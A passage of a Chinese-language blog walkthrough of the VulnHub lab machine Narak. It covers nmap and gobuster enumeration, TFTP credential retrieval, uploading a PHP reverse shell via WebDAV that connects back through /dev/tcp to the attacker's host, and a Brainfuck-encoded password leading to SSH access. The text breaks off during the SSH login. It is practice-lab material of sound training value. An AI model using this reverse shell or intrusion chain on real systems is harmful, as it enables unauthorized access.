<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>vulnhub-Narak通关记录 | Peony</title><meta name="author" content="Peony"><meta name="copyright" content="Peony"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本文记录了作者在通关vulnhub靶机Narak中遇到的问题以及踩坑后的解决方案。涉及TFTP信息泄漏，webdav反弹shell上传。二级提权，第一级通过找到可写bash脚本文件中的brainfuck语句，获得凭据，二级通过motd脚本获得root权限。">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub-Narak通关记录">
<meta property="og:url" content="https://peonycsa.com/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="Peony">
<meta property="og:description" content="本文记录了作者在通关vulnhub靶机Narak中遇到的问题以及踩坑后的解决方案。涉及TFTP信息泄漏，webdav反弹shell上传。二级提权，第一级通过找到可写bash脚本文件中的brainfuck语句，获得凭据，二级通过motd脚本获得root权限。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg">
<meta property="article:published_time" content="2023-04-18T13:54:56.000Z">
<meta property="article:modified_time" content="2023-07-16T06:20:43.259Z">
<meta property="article:author" content="Peony">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="vulnhub">
<meta property="article:tag" content="Narak">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg"><link rel="shortcut icon" href="https://pic.imgdb.cn/item/647c139af024cca1732734de.png"><link rel="canonical" href="https://peonycsa.com/2023/04/18/vulnhub-Narak%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.4.0/css/all.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://fastly.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'vulnhub-Narak通关记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-16 14:20:43'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/647c139af024cca1732734de.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/647cc8931ddac507ccbda697.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Peony"><span class="site-name">Peony</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 杂项</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/life/"><i class="fa-fw fas fa-music"></i><span> 生活</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movie/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub-Narak通关记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-18T13:54:56.000Z" title="发表于 2023-04-18 21:54:56">2023-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-16T06:20:43.259Z" title="更新于 2023-07-16 14:20:43">2023-07-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><p>将靶机导入 VM ，然后用侦测靶机 IP 地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn --min-rate 10000 192.168.xxx.0/24</span><br></pre></td></tr></table></figure>

<p>这段命令的含义是：</p>
<p><code>-sn</code> 不进行端口扫描，只进行主机发现，即判断目标网段中哪些主机是存活的，<br><code>–min-rate 10000</code> 设置扫描的最小速率为10000个数据包每秒，可以提高扫描效率，但也可能导致丢包或误报。<br><code>192.168.xxx.0/24</code> 指定目标网段为192.168.xxx.0&#x2F;24，即192.168.xxx.0到192.168.xxx.255共256个IP地址。</p>
<p>靶机打开前后进行两次扫描，从而可以通过对比确定靶机地址。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]</span><br><span class="line">└─$ sudo nmap -sn --min-rate 10000 192.168.xxx.0/24</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-03 05:20 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.xxx.1</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.xxx.2</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:FA:6C:6F (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.xxx.132</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:0C:29:60:A2:BC (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.xxx.254</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:CA:55 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.xxx.130</span><br><span class="line">Host is up.</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="keyword">in</span> 0.62 seconds</span><br></pre></td></tr></table></figure>

<p>确定靶机<code>192.168.xxx.132</code>之后，对靶机进行探测：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -p- --min-rate 10000 192.168.xxx.132</span><br></pre></td></tr></table></figure>

<p>该命令的含义是：</p>
<p><code>-sT</code>：使用 TCP connect 扫描，即完成TCP的三次握手阶段进行扫描，可以判断目标主机开放了哪些端口。<br><code>-p-</code>：指定扫描所有端口，即从1到65535共65535个端口，这样可以避免遗漏一些不常见的端口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -v -O -p22,80 --min-rate 10000 192.168.xxx.132 -oA narakDetails</span><br></pre></td></tr></table></figure>

<p>扫描结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/647c13a8f024cca173274bbd.png" alt="扫描结果"></p>
<p>该命令的含义是：</p>
<p><code>-sV</code> ：探测目标主机开放端口的服务版本信息，可以获取更多的细节，如软件名称、版本号等。<br><code>-sC</code> ：使用默认的Nmap Scripting Engine (NSE)脚本进行扫描，可以执行一些常见的安全检测和漏洞利用等。<br><code>-v</code> ：增加输出的详细程度，显示更多的运行时信息和警告。<br><code>-O</code> ：尝试探测目标主机的操作系统类型和版本，需要有root权限才能执行。<br><code>-p22,80</code> ：指定只扫描22和80两个端口，可以节省时间和资源。<br><code>-oA narakDetails</code> ：指定输出结果的格式为三种（普通、XML、grepable）并保存到以narakDetails为前缀的文件中。</p>
<p>扫描结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/64b2d7241ddac507cc2fcbca.jpg" alt="扫描结果"></p>
<p>接着用UDP协议进行探测：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU --top-port 20 --min-rate 10000 192.168.xxx.132</span><br></pre></td></tr></table></figure>

<p>该命令的含义是：</p>
<p><code>-sU</code> ：使用UDP扫描，即发送UDP数据包到目标主机的端口，根据响应判断端口是否开放。<br><code>--top-port 20</code> ：指定扫描最常见的20个端口，可以节省时间和资源。</p>
<p>扫描结果如图所示：</p>
<p><img src="https://pic.imgdb.cn/item/647c13a9f024cca173274d06.png" alt="UDP扫描结果"></p>
<p>从 UDP 扫描结果可以发现，靶机似乎存在 TFTP 服务<sup><a href="#TFTP-%E8%8E%B7%E5%8F%96%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6">①</a></sup>，但是目前没有利用点，继续向下走。</p>
<h3 id="gobuster-爆破目录"><a href="#gobuster-爆破目录" class="headerlink" title="gobuster 爆破目录"></a>gobuster 爆破目录</h3><p>之后用 gobuster 爆破目录，字典用的 dirbuster 带的字典，<del>属实是NTR了。</del></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster dir -u 192.168.xxx.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.imgdb.cn/item/647c13a8f024cca173274c1e.png" alt="gobuster爆破结果"></p>
<h3 id="webdav上传shell"><a href="#webdav上传shell" class="headerlink" title="webdav上传shell"></a>webdav上传shell</h3><p>发现 webdav 服务，<code>http://192.168.xxx.132/webdav</code></p>
<p><img src="https://pic.imgdb.cn/item/647c13a8f024cca173274c85.png" alt="Webdav服务"></p>
<div class="note danger simple"><p>注意：gobuster 默认不扫描 <code>zip</code> , <code>rar</code> , <code>sql</code> , <code>txt</code> 文件，因此需要用 <code>-x</code> 参数指定</p>
</div>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gobuster <span class="built_in">dir</span> -u 192.168.118.132 -x zip,rar,sql,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>

<p>又发现 <code>http://192.168.xxx.132/tips.txt</code> ，提示为：“Hint to open the door of narak can be found in creds.txt.”</p>
<p>尝试访问一下：<code>http://192.168.xxx.132/creds.txt</code> ，然而并没能请求到该文件，说明这条路走不通。</p>
<p>接下来试试前文提到的 TFTP 服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tftp 192.168.xxx.132</span><br><span class="line">get creds.txt</span><br></pre></td></tr></table></figure>

<p>欸，居然成功了。打开文件观察一下，发现是 base64 编码的，解码后返回一对账号密码：</p>
<p><img src="https://pic.imgdb.cn/item/647c13a9f024cca173274d2e.png" alt="账号密码"></p>
<p>登录 Webdav ，结果发现没有任何可利用的文件，想到能不能写入文件，从 kali 的工具手册找到 Devtest 工具。</p>
<blockquote>
<p>DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.</p>
</blockquote>
<p><code>Devtest</code> 这个工具就是用来测试 WebDAV 有哪些文件允许上传，并且能够上传 shell 文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo davtest -auth yamdoot:Swarg -cleanup -url http://192.168.118.132/webdav</span><br></pre></td></tr></table></figure>

<p>测试结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/647c13a9f024cca173274e08.png" alt="davtest 测试结果"></p>
<p>可以看到，php文件师是能够执行的，这里可以直接写入 webshell 用工具连接，也可以写入一句话反弹 shell 。此处选择后者：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;\bin\bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.xxx.130/ 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move&#x2F;copy), collection creation and deletion, property manipulation, and resource locking.</p>
<p>Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).</p>
<p>This package includes GnuTLS (HTTPS) support.</p>
<p>WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.</p>
</blockquote>
<p><code>cadaver</code> 是一个可以用来访问和编辑web服务器上的文件的工具，kali 系统中默认装有此软件，因此用 cadaver 通过之前活得的用户名与密码，写入 <code>shell.php</code> 上传，使用 nc 监听端口<sup><a href="#nc%E5%8F%82%E6%95%B0%E5%90%AB%E4%B9%89">②</a></sup>，然后请求 <code>http://192.168.xxx.132/webdav/shell.php</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php exec(&quot;</span>/bin/bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.xxx.130/2333 0&gt;&amp;1&#x27;</span><span class="string">&quot;);?&gt;&quot;</span> &gt; shell.php</span><br><span class="line">cadaver http://192.168.xxx.132/webdav <span class="comment"># then enter User ID and passwd</span></span><br><span class="line">put /path/to/shell.php</span><br><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure>

<p>可以看到已经回弹 shell 了，是 <code>www-data</code> 用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]</span><br><span class="line">└─$ nc -lvnp 2333</span><br><span class="line">listening on [any] 2333 ...</span><br><span class="line">connect to [192.168.xxx.130] from (UNKNOWN) [192.168.xxx.132] 56482</span><br><span class="line">bash: cannot set terminal process group (590): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">www-data@ubuntu:/var/www/webdav$  </span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="find命令查找可写文件"><a href="#find命令查找可写文件" class="headerlink" title="find命令查找可写文件"></a>find命令查找可写文件</h3><p>通过 <code>find</code> 命令，寻找可写文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -writable -<span class="built_in">type</span> f -not -path <span class="string">&quot;/proc/*&quot;</span> -not -path <span class="string">&quot;/sys/*&quot;</span> 2&gt;/dev/null </span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/647c13a9f024cca173274e70.png" alt="提权1"></p>
<p>首先查看 <code>/mnt/hell.sh</code> 文件，通过查询资料发现是 Brainfuck 加密<sup><a href="#Brainfuck-%E5%8A%A0%E5%AF%86">③</a></sup>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/webdav$ cat /mnt/hell.sh</span><br><span class="line">cat /mnt/hell.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">echo&quot;Highway to Hell&quot;;</span><br><span class="line">--[-----&gt;+&lt;]&gt;---.+++++.+.+++++++++++.--.+++[-&gt;+++&lt;]&gt;++.++++++.--[---&gt;+&lt;]&gt;--.-----.++++.</span><br></pre></td></tr></table></figure>

<p>使用 kali 自带的 beef 软件解密，结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]</span><br><span class="line">└─$ beef highway.bf</span><br><span class="line">chitragupt    </span><br></pre></td></tr></table></figure>

<blockquote>
<p>Beef is a flexible interpreter for the Brainfuck programming language.<br>It  can  be configured using the options described below, making it possible to run Brainfuck programs that make assumptions about the behavior of the interpreter.<br>Beef sets no arbitrary limit to the size of the memory tape used by the program, and allocates memory cells as they are needed.</p>
</blockquote>
<p><del>在这卡了很久，还是打靶太少了。</del></p>
<p>最后猜测这应该是一个用户的密码，于是通过 <code>cat /etc/passwd</code> 的方式查看机器中有哪些用户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/webdav$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">narak:x:1000:1000:narak,,,:/home/narak:/bin/bash</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">yamdoot:x:1001:1001:,,,:/home/yamdoot:/bin/bash</span><br><span class="line">inferno:x:1002:1002:,,,:/home/inferno:/bin/bash</span><br></pre></td></tr></table></figure>

<p>可以看到， <code>narak</code> 用户的 GECOS 字段中的逗号后面的文本是 <code>,,,</code> ，表示没有提供有关该用户的额外信息或描述。同样地， <code>yamdoot</code> 和 <code>inferno</code> 用户的 GECOS 字段中的逗号后面的文本也表示没有提供额外信息。</p>
<p>因此猜测这三个账号是我们所需要尝试的账号。</p>
<h3 id="ssh登录普通权限"><a href="#ssh登录普通权限" class="headerlink" title="ssh登录普通权限"></a>ssh登录普通权限</h3><p>尝试之后，成功登入inferno账户：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/BoxWalk/Vulnhub/HA-Narak]</span><br><span class="line">└─$ ssh inferno@192.168.xxx.132                                                 </span><br><span class="line">inferno@192.168.xxx.132&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available for installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span 